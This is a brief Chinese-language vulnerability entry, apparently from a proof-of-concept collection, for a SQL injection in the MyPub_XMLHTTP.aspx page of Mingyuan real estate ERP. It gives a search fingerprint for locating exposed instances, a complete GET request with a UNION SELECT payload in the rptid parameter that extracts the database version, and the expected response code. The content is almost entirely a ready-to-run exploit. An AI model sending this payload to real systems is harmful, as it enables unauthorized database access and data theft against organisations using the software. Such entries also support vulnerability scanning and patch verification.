# 明源地产ERPMyPub_XMLHTTP.aspx存在SQL注入漏洞

明源地产 ｜ SQL注入 ｜ —
- **指纹**：`body="/_common/scripts/md5-min.js"`
- **请求**：`GET /Sldzkp/DZKP/MyPub_XMLHTTP.aspx/?ywtype=GETPRINTVAL&rptid=1%27+UNION+ALL+SELECT+NULL%2C%40%40version%2CNULL%2CNULL-- HTTP/1.1`
- **响应特征**：200